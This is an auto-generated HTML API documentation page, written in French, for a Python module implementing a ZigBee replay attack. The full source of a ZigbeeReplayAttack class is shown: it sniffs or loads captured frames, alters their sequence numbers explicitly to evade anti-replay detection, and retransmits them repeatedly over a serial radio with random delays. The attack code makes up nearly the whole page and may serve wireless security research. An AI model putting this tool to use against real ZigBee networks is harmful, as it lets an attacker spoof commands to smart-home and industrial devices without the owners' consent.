<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
<meta name="generator" content="pdoc3 0.11.5">
<title>scripts.replay API documentation</title>
<meta name="description" content="Attaque de replay sur le réseau ZigBee …">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/sanitize.min.css" integrity="sha512-y1dtMcuvtTMJc1yPgEqF0ZjQbhnc/bFhyvIyVNb9Zk5mIGtqVaAB1Ttl28su8AvFMOY0EwRbAe+HCLqj6W7/KA==" crossorigin>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/typography.min.css" integrity="sha512-Y1DYSb995BAfxobCkKepB1BqJJTPrOp3zPL74AWFugHHmmdcvO+C48WLrUOlhGMc0QG7AE3f7gmvvcrmX2fDoA==" crossorigin>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:1.5em;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:2em 0 .50em 0}h3{font-size:1.4em;margin:1.6em 0 .7em 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .2s ease-in-out}a:visited{color:#503}a:hover{color:#b62}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900;font-weight:bold}pre code{font-size:.8em;line-height:1.4em;padding:1em;display:block}code{background:#f3f3f3;font-family:"DejaVu Sans Mono",monospace;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source > summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible;min-width:max-content}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em 1em;margin:1em 0}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul ul{padding-left:1em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" integrity="sha512-D9gUyxqja7hBtkWpPWGt9wfbfaMGVt9gnyCvYa+jojwwPHLCzUm5i8rpk7vD7wNee9bA35eYIjobYPaQuKS1MQ==" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => {
hljs.configure({languages: ['bash', 'css', 'diff', 'graphql', 'ini', 'javascript', 'json', 'plaintext', 'python', 'python-repl', 'rust', 'shell', 'sql', 'typescript', 'xml', 'yaml']});
hljs.highlightAll();
/* Collapse source docstrings */
setTimeout(() => {
[...document.querySelectorAll('.hljs.language-python > .hljs-string')]
.filter(el => el.innerHTML.length > 200 && ['"""', "'''"].includes(el.innerHTML.substring(0, 3)))
.forEach(el => {
let d = document.createElement('details');
d.classList.add('hljs-string');
d.innerHTML = '<summary>"""</summary>' + el.innerHTML.substring(3);
el.replaceWith(d);
});
}, 100);
})</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>scripts.replay</code></h1>
</header>
<section id="section-intro">
<p>Attaque de replay sur le réseau ZigBee.</p>
<p>Ce module implémente une attaque de replay sur le réseau ZigBee. Il permet de
capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer
sur le réseau ZigBee. Il gère également les mécanismes de protection contre les
attaques de type replay et permet de personnaliser la configuration de l'attaque.</p>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="scripts.replay.ZigbeeReplayAttack"><code class="flex name class">
<span>class <span class="ident">ZigbeeReplayAttack</span></span>
<span>(</span><span>capture_file: str = 'captures_zigbee.json',<br>channel: int = 13,<br>pan_id: int = 6400,<br>serial_port: str | None = None,<br>aes_key: str | None = None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class ZigbeeReplayAttack:
    &#34;&#34;&#34;
    Classe pour effectuer une attaque de replay sur le réseau ZigBee.
    
    Cette classe permet de capturer des trames ZigBee, de les analyser, 
    de les modifier (par exemple, en modifiant les numéros de séquence) 
    et de les rejouer sur le réseau ZigBee. Elle gère également les 
    mécanismes de protection contre les attaques de type replay et permet 
    de personnaliser la configuration de l&#39;attaque.
    &#34;&#34;&#34;

    def __init__(
        self, 
        capture_file: str = &#39;captures_zigbee.json&#39;, 
        channel: int = 13, 
        pan_id: int = 0x1900,
        serial_port: Optional[str] = None,
        aes_key: Optional[str] = None
    ):
        &#34;&#34;&#34;
        Initialise l&#39;attaque de replay ZigBee.

        Parameters
        ----------
        capture_file : str, optional
            Nom du fichier de capture pour stocker les trames ZigBee capturées.
            Par défaut &#39;captures_zigbee.json&#39;.
        channel : int, optional
            Canal ZigBee sur lequel l&#39;attaque de replay sera effectuée.
            Par défaut 13.
        pan_id : int, optional
            PAN ID du réseau ZigBee. Par défaut 0x1900.
        serial_port : str, optional
            Port série utilisé pour envoyer les trames de replay.
        aes_key : str, optional
            Clé AES pour la sécurité des trames, si applicable.
        &#34;&#34;&#34;
        self.capture_file = capture_file
        self.channel = channel
        self.pan_id = pan_id
        self.serial_port = serial_port
        self.aes_key = aes_key
        
        # Initialisation des classes auxiliaires
        self.codeur = CodeurTrameZigbee(logger)
        self.decodeur = DecodeurTrameZigbee(logger)
        self.sniffer = SniffeurZigbee(
            canal=channel,
            fichier_sortie=capture_file,
            vitesse_bauds=115200
        )
        
        # Gestion des séquences et anti-replay
        self.sequence_base = None
        self.sequence_offset = 0
        self.captures = []
        self.replay_queue = queue.Queue()
        self.sequence_variations = []

    def capturer_trames_live(self, duree_capture: int = 10):
        &#34;&#34;&#34;
        Capture live des trames ZigBee pendant une durée spécifiée.

        Parameters
        ----------
        duree_capture : int, optional
            Durée de la capture en secondes. Par défaut 10.
        &#34;&#34;&#34;
        logger.info(f&#34;Démarrage de la capture live pour {duree_capture} secondes&#34;)
        self.sniffer.demarrer_sniffer()
        time.sleep(duree_capture)
        self.sniffer.arreter_sniffer()
        self.sniffer.sauvegarder_captures()
        self.captures = self.sniffer.captures
        logger.info(f&#34;Capture terminée : {len(self.captures)} trames capturées&#34;)

    def charger_captures(self):
        &#34;&#34;&#34;
        Charge et analyse les captures ZigBee à partir d&#39;un fichier JSON.

        Cette méthode lit le fichier de captures spécifié lors de l&#39;initialisation
        et décode chaque trame pour préparer l&#39;attaque de replay.
        &#34;&#34;&#34;
        try:
            with open(self.capture_file, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
                raw_captures = json.load(f)
                
            # Décoder chaque trame capturée
            self.captures = []
            for capture in raw_captures:
                if isinstance(capture, str):  # Si c&#39;est une chaîne hex
                    trame_bytes = bytes.fromhex(capture)
                    trame_decodee = self.decodeur.decoder_trame_zigbee(trame_bytes)
                    if trame_decodee:
                        self.captures.append(trame_decodee)
                else:  # Si c&#39;est déjà un dictionnaire décodé
                    self.captures.append(capture)
            
            # Extraire les séquences
            self._extraire_sequences()
            logger.info(f&#34;Chargement réussi : {len(self.captures)} trames&#34;)
            
        except Exception as e:
            logger.error(f&#34;Erreur lors du chargement des captures : {e}&#34;)
            self.captures = []

    def _extraire_sequences(self):
        &#34;&#34;&#34;
        Extrait les numéros de séquence des trames capturées.

        Cette méthode privée analyse les trames capturées pour extraire
        les numéros de séquence et initialiser la séquence de base.
        &#34;&#34;&#34;
        sequences = []
        for capture in self.captures:
            if capture[&#39;type_trame&#39;] == &#39;Data&#39;:
                seq = capture[&#39;couche_mac&#39;].get(&#39;numero_sequence&#39;)
                if seq is not None:
                    sequences.append(seq)
            elif &#39;sequence_number&#39; in capture:
                sequences.append(capture[&#39;sequence_number&#39;])
                
        if sequences:
            self.sequence_base = min(sequences)
            self._generer_variations_sequence()

    def _generer_variations_sequence(self):
        &#34;&#34;&#34;
        Génère des variations de numéro de séquence basées sur la séquence de base.

        Cette méthode privée crée différentes variations des numéros de séquence
        pour éviter la détection des attaques de replay.
        &#34;&#34;&#34;
        if not self.sequence_base:
            return
        
        variations = [
            self.sequence_base,
            (self.sequence_base + 1) % 256,
            (self.sequence_base + random.randint(2, 10)) % 256,
            self._generer_sequence_cryptographique()
        ]
        
        self.sequence_variations = variations
        logger.debug(f&#34;Variations de séquence générées : {self.sequence_variations}&#34;)

    def _generer_sequence_cryptographique(self) -&gt; int:
        &#34;&#34;&#34;
        Génère un numéro de séquence cryptographiquement sûr.

        Returns
        -------
        int
            Numéro de séquence généré de manière cryptographique.
        &#34;&#34;&#34;
        seed = hashlib.sha256(
            str(self.sequence_base).encode() + 
            str(time.time()).encode()
        ).digest()
        return int.from_bytes(seed[:1], byteorder=&#39;big&#39;)

    def preparer_trame_replay(self, trame_originale: dict) -&gt; bytes:
        &#34;&#34;&#34;
        Prépare une trame pour le replay en modifiant le numéro de séquence.

        Parameters
        ----------
        trame_originale : dict
            Trame ZigBee originale à modifier.

        Returns
        -------
        bytes
            Trame prête à être envoyée en replay.
        &#34;&#34;&#34;
        sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
        
        # Modifier la séquence dans la trame
        if trame_originale[&#39;type_trame&#39;] == &#39;Data&#39;:
            trame_originale[&#39;couche_mac&#39;][&#39;numero_sequence&#39;] = sequence
            trame_originale[&#39;couche_reseau&#39;][&#39;sequence_number&#39;] = sequence
        else:
            trame_originale[&#39;sequence_number&#39;] = sequence
            
        # Encoder la trame modifiée
        return self.codeur.encoder_trame_zigbee(trame_originale)

    def preparer_trames_replay(self, nombre_trames: int = 20):
        &#34;&#34;&#34;
        Prépare plusieurs trames pour le replay.

        Parameters
        ----------
        nombre_trames : int, optional
            Nombre de trames à préparer pour le replay. Par défaut 20.
        &#34;&#34;&#34;
        self.replay_queue = queue.Queue()
        
        for _ in range(nombre_trames):
            if not self.captures:
                continue

            trame_originale = random.choice(self.captures)
            trame_modifiee = self.preparer_trame_replay(trame_originale)
            self.replay_queue.put(trame_modifiee)

    def envoyer_trames_replay(self, nombre_replays: int = 5):
        &#34;&#34;&#34;
        Envoie les trames de replay via le port série.

        Parameters
        ----------
        nombre_replays : int, optional
            Nombre de fois que chaque trame sera envoyée. Par défaut 5.
        &#34;&#34;&#34;
        try:
            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                logger.info(f&#34;Début du replay via {self.serial_port}&#34;)
                
                while not self.replay_queue.empty():
                    trame = self.replay_queue.get()
                    
                    for _ in range(nombre_replays):
                        # Construction de la trame complète avec en-tête
                        trame_complete = bytearray([
                            len(trame) + 3,  # Longueur
                            self.channel,    # Canal
                            self.pan_id &gt;&gt; 8,  # PAN ID (octet haut)
                            self.pan_id &amp; 0xFF  # PAN ID (octet bas)
                        ])
                        trame_complete.extend(trame)
                        
                        # Envoi avec délai aléatoire
                        ser.write(trame_complete)
                        time.sleep(random.uniform(0.1, 0.5))
                        
                        logger.debug(f&#34;Trame replay envoyée - Longueur: {len(trame_complete)}&#34;)
                        
        except Exception as e:
            logger.error(f&#34;Erreur durant le replay : {e}&#34;)

    def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
        &#34;&#34;&#34;
        Lance l&#39;attaque de replay complète avec capture et envoi des trames.

        Parameters
        ----------
        nombre_replays : int, optional
            Nombre de fois que chaque trame sera envoyée. Par défaut 5.
        capture_live : bool, optional
            Si True, effectue une capture live des trames ZigBee. Par défaut False.
        &#34;&#34;&#34;
        try:
            if capture_live:
                self.capturer_trames_live()
            else:
                self.charger_captures()
                
            if not self.captures:
                logger.error(&#34;Aucune trame à rejouer&#34;)
                return
                
            self.preparer_trames_replay()
            
            # Lancement du replay dans un thread séparé
            thread_replay = threading.Thread(
                target=self.envoyer_trames_replay, 
                kwargs={&#39;nombre_replays&#39;: nombre_replays}
            )
            thread_replay.start()
            thread_replay.join()
            
        except Exception as e:
            logger.error(f&#34;Échec de l&#39;attaque de replay : {e}&#34;)</code></pre>
</details>
<div class="desc"><p>Classe pour effectuer une attaque de replay sur le réseau ZigBee.</p>
<p>Cette classe permet de capturer des trames ZigBee, de les analyser,
de les modifier (par exemple, en modifiant les numéros de séquence)
et de les rejouer sur le réseau ZigBee. Elle gère également les
mécanismes de protection contre les attaques de type replay et permet
de personnaliser la configuration de l'attaque.</p>
<p>Initialise l'attaque de replay ZigBee.</p>
<h2 id="parameters">Parameters</h2>
<dl>
<dt><strong><code>capture_file</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>Nom du fichier de capture pour stocker les trames ZigBee capturées.
Par défaut 'captures_zigbee.json'.</dd>
<dt><strong><code>channel</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>Canal ZigBee sur lequel l'attaque de replay sera effectuée.
Par défaut 13.</dd>
<dt><strong><code>pan_id</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>PAN ID du réseau ZigBee. Par défaut 0x1900.</dd>
<dt><strong><code>serial_port</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>Port série utilisé pour envoyer les trames de replay.</dd>
<dt><strong><code>aes_key</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>Clé AES pour la sécurité des trames, si applicable.</dd>
</dl></div>
<h3>Methods</h3>
<dl>
<dt id="scripts.replay.ZigbeeReplayAttack.capturer_trames_live"><code class="name flex">
<span>def <span class="ident">capturer_trames_live</span></span>(<span>self, duree_capture: int = 10)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def capturer_trames_live(self, duree_capture: int = 10):
    &#34;&#34;&#34;
    Capture live des trames ZigBee pendant une durée spécifiée.

    Parameters
    ----------
    duree_capture : int, optional
        Durée de la capture en secondes. Par défaut 10.
    &#34;&#34;&#34;
    logger.info(f&#34;Démarrage de la capture live pour {duree_capture} secondes&#34;)
    self.sniffer.demarrer_sniffer()
    time.sleep(duree_capture)
    self.sniffer.arreter_sniffer()
    self.sniffer.sauvegarder_captures()
    self.captures = self.sniffer.captures
    logger.info(f&#34;Capture terminée : {len(self.captures)} trames capturées&#34;)</code></pre>
</details>
<div class="desc"><p>Capture live des trames ZigBee pendant une durée spécifiée.</p>
<h2 id="parameters">Parameters</h2>
<dl>
<dt><strong><code>duree_capture</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>Durée de la capture en secondes. Par défaut 10.</dd>
</dl></div>
</dd>
<dt id="scripts.replay.ZigbeeReplayAttack.charger_captures"><code class="name flex">
<span>def <span class="ident">charger_captures</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def charger_captures(self):
    &#34;&#34;&#34;
    Charge et analyse les captures ZigBee à partir d&#39;un fichier JSON.

    Cette méthode lit le fichier de captures spécifié lors de l&#39;initialisation
    et décode chaque trame pour préparer l&#39;attaque de replay.
    &#34;&#34;&#34;
    try:
        with open(self.capture_file, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
            raw_captures = json.load(f)
            
        # Décoder chaque trame capturée
        self.captures = []
        for capture in raw_captures:
            if isinstance(capture, str):  # Si c&#39;est une chaîne hex
                trame_bytes = bytes.fromhex(capture)
                trame_decodee = self.decodeur.decoder_trame_zigbee(trame_bytes)
                if trame_decodee:
                    self.captures.append(trame_decodee)
            else:  # Si c&#39;est déjà un dictionnaire décodé
                self.captures.append(capture)
        
        # Extraire les séquences
        self._extraire_sequences()
        logger.info(f&#34;Chargement réussi : {len(self.captures)} trames&#34;)
        
    except Exception as e:
        logger.error(f&#34;Erreur lors du chargement des captures : {e}&#34;)
        self.captures = []</code></pre>
</details>
<div class="desc"><p>Charge et analyse les captures ZigBee à partir d'un fichier JSON.</p>
<p>Cette méthode lit le fichier de captures spécifié lors de l'initialisation
et décode chaque trame pour préparer l'attaque de replay.</p></div>
</dd>
<dt id="scripts.replay.ZigbeeReplayAttack.envoyer_trames_replay"><code class="name flex">
<span>def <span class="ident">envoyer_trames_replay</span></span>(<span>self, nombre_replays: int = 5)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def envoyer_trames_replay(self, nombre_replays: int = 5):
    &#34;&#34;&#34;
    Envoie les trames de replay via le port série.

    Parameters
    ----------
    nombre_replays : int, optional
        Nombre de fois que chaque trame sera envoyée. Par défaut 5.
    &#34;&#34;&#34;
    try:
        with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
            logger.info(f&#34;Début du replay via {self.serial_port}&#34;)
            
            while not self.replay_queue.empty():
                trame = self.replay_queue.get()
                
                for _ in range(nombre_replays):
                    # Construction de la trame complète avec en-tête
                    trame_complete = bytearray([
                        len(trame) + 3,  # Longueur
                        self.channel,    # Canal
                        self.pan_id &gt;&gt; 8,  # PAN ID (octet haut)
                        self.pan_id &amp; 0xFF  # PAN ID (octet bas)
                    ])
                    trame_complete.extend(trame)
                    
                    # Envoi avec délai aléatoire
                    ser.write(trame_complete)
                    time.sleep(random.uniform(0.1, 0.5))
                    
                    logger.debug(f&#34;Trame replay envoyée - Longueur: {len(trame_complete)}&#34;)
                    
    except Exception as e:
        logger.error(f&#34;Erreur durant le replay : {e}&#34;)</code></pre>
</details>
<div class="desc"><p>Envoie les trames de replay via le port série.</p>
<h2 id="parameters">Parameters</h2>
<dl>
<dt><strong><code>nombre_replays</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>Nombre de fois que chaque trame sera envoyée. Par défaut 5.</dd>
</dl></div>
</dd>
<dt id="scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay"><code class="name flex">
<span>def <span class="ident">lancer_attaque_replay</span></span>(<span>self, nombre_replays: int = 5, capture_live: bool = False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
    &#34;&#34;&#34;
    Lance l&#39;attaque de replay complète avec capture et envoi des trames.

    Parameters
    ----------
    nombre_replays : int, optional
        Nombre de fois que chaque trame sera envoyée. Par défaut 5.
    capture_live : bool, optional
        Si True, effectue une capture live des trames ZigBee. Par défaut False.
    &#34;&#34;&#34;
    try:
        if capture_live:
            self.capturer_trames_live()
        else:
            self.charger_captures()
            
        if not self.captures:
            logger.error(&#34;Aucune trame à rejouer&#34;)
            return
            
        self.preparer_trames_replay()
        
        # Lancement du replay dans un thread séparé
        thread_replay = threading.Thread(
            target=self.envoyer_trames_replay, 
            kwargs={&#39;nombre_replays&#39;: nombre_replays}
        )
        thread_replay.start()
        thread_replay.join()
        
    except Exception as e:
        logger.error(f&#34;Échec de l&#39;attaque de replay : {e}&#34;)</code></pre>
</details>
<div class="desc"><p>Lance l'attaque de replay complète avec capture et envoi des trames.</p>
<h2 id="parameters">Parameters</h2>
<dl>
<dt><strong><code>nombre_replays</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>Nombre de fois que chaque trame sera envoyée. Par défaut 5.</dd>
<dt><strong><code>capture_live</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>Si True, effectue une capture live des trames ZigBee. Par défaut False.</dd>
</dl></div>
</dd>
<dt id="scripts.replay.ZigbeeReplayAttack.preparer_trame_replay"><code class="name flex">
<span>def <span class="ident">preparer_trame_replay</span></span>(<span>self, trame_originale: dict) ‑> bytes</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def preparer_trame_replay(self, trame_originale: dict) -&gt; bytes:
    &#34;&#34;&#34;
    Prépare une trame pour le replay en modifiant le numéro de séquence.

    Parameters
    ----------
    trame_originale : dict
        Trame ZigBee originale à modifier.

    Returns
    -------
    bytes
        Trame prête à être envoyée en replay.
    &#34;&#34;&#34;
    sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
    
    # Modifier la séquence dans la trame
    if trame_originale[&#39;type_trame&#39;] == &#39;Data&#39;:
        trame_originale[&#39;couche_mac&#39;][&#39;numero_sequence&#39;] = sequence
        trame_originale[&#39;couche_reseau&#39;][&#39;sequence_number&#39;] = sequence
    else:
        trame_originale[&#39;sequence_number&#39;] = sequence
        
    # Encoder la trame modifiée
    return self.codeur.encoder_trame_zigbee(trame_originale)</code></pre>
</details>
<div class="desc"><p>Prépare une trame pour le replay en modifiant le numéro de séquence.</p>
<h2 id="parameters">Parameters</h2>
<dl>
<dt><strong><code>trame_originale</code></strong> :&ensp;<code>dict</code></dt>
<dd>Trame ZigBee originale à modifier.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>bytes</code></dt>
<dd>Trame prête à être envoyée en replay.</dd>
</dl></div>
</dd>
<dt id="scripts.replay.ZigbeeReplayAttack.preparer_trames_replay"><code class="name flex">
<span>def <span class="ident">preparer_trames_replay</span></span>(<span>self, nombre_trames: int = 20)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def preparer_trames_replay(self, nombre_trames: int = 20):
    &#34;&#34;&#34;
    Prépare plusieurs trames pour le replay.

    Parameters
    ----------
    nombre_trames : int, optional
        Nombre de trames à préparer pour le replay. Par défaut 20.
    &#34;&#34;&#34;
    self.replay_queue = queue.Queue()
    
    for _ in range(nombre_trames):
        if not self.captures:
            continue

        trame_originale = random.choice(self.captures)
        trame_modifiee = self.preparer_trame_replay(trame_originale)
        self.replay_queue.put(trame_modifiee)</code></pre>
</details>
<div class="desc"><p>Prépare plusieurs trames pour le replay.</p>
<h2 id="parameters">Parameters</h2>
<dl>
<dt><strong><code>nombre_trames</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>Nombre de trames à préparer pour le replay. Par défaut 20.</dd>
</dl></div>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="scripts" href="index.html">scripts</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="scripts.replay.ZigbeeReplayAttack" href="#scripts.replay.ZigbeeReplayAttack">ZigbeeReplayAttack</a></code></h4>
<ul class="">
<li><code><a title="scripts.replay.ZigbeeReplayAttack.capturer_trames_live" href="#scripts.replay.ZigbeeReplayAttack.capturer_trames_live">capturer_trames_live</a></code></li>
<li><code><a title="scripts.replay.ZigbeeReplayAttack.charger_captures" href="#scripts.replay.ZigbeeReplayAttack.charger_captures">charger_captures</a></code></li>
<li><code><a title="scripts.replay.ZigbeeReplayAttack.envoyer_trames_replay" href="#scripts.replay.ZigbeeReplayAttack.envoyer_trames_replay">envoyer_trames_replay</a></code></li>
<li><code><a title="scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay" href="#scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay">lancer_attaque_replay</a></code></li>
<li><code><a title="scripts.replay.ZigbeeReplayAttack.preparer_trame_replay" href="#scripts.replay.ZigbeeReplayAttack.preparer_trame_replay">preparer_trame_replay</a></code></li>
<li><code><a title="scripts.replay.ZigbeeReplayAttack.preparer_trames_replay" href="#scripts.replay.ZigbeeReplayAttack.preparer_trames_replay">preparer_trames_replay</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.11.5</a>.</p>
</footer>
</body>
</html>
